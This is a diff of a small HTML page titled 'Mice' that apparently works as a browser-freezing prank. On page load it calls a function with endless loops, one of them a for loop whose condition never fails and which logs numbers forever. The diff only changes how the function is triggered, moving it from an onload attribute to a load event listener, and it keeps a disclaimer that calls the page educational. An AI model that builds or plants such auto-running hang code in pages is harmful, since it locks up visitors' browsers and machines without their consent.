@@ -11,7 +11,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mice</title>
 </head>
-<body onload="start()">
+<body>
     <script type="text/javascript">
     function start() {
         while (true) {      
@@ -23,9 +23,12 @@
         }
         for(var i = 0; i === i; i++) {console.log(i)}
     }
+    window.addEventListener("load", (event) => {
+        start();
+    });
     </script>
     <center>
-    <img src="Mice.png" alt="Mice">
+    <img rel="preload" src="Mice.png" alt="Mice">
     this was just for educational purposes (i used it for testing browsers/computers). author is not responsible for anything. for example misuse.
     </center>
 </body>
